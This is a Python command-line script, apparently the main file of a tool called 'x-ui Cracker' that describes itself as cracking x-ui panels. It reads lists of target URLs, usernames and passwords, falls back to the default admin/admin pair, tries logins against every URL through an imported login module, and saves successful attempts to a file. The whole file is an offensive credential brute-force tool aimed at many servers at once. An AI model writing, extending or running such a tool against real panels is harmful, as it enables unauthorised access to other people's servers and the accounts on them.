import argparse
import threading
from src import banners
from src.login import login, process_login, load_credentials_from_file

def main():

    banners()

    parser = argparse.ArgumentParser(
        prog='x-ui Cracker',
        description='Crack the x-ui panels. Use -h or --help to show this help message and exit.')
    parser.add_argument('-uf', '--userfile', help='Specify the file containing usernames')
    parser.add_argument('-pf', '--passfile', help='Specify the file containing passwords')
    parser.add_argument('-lf', '--listfile', help='Specify the file containing list of URLs')
    parser.add_argument('-sf', '--successfile', help='Specify the file to save successful attempts')
    args = parser.parse_args()

    if not args.listfile:
        parser.print_help()
        return


    urls = load_credentials_from_file(args.listfile)

    if args.userfile and args.passfile:
        usernames = load_credentials_from_file(args.userfile)
        passwords = load_credentials_from_file(args.passfile)
    else:
        usernames = ['admin']
        passwords = ['admin']

    for url in urls:
        url = url.strip()
        process_login(url, usernames, passwords, args.successfile)

if __name__ == "__main__":
    main()
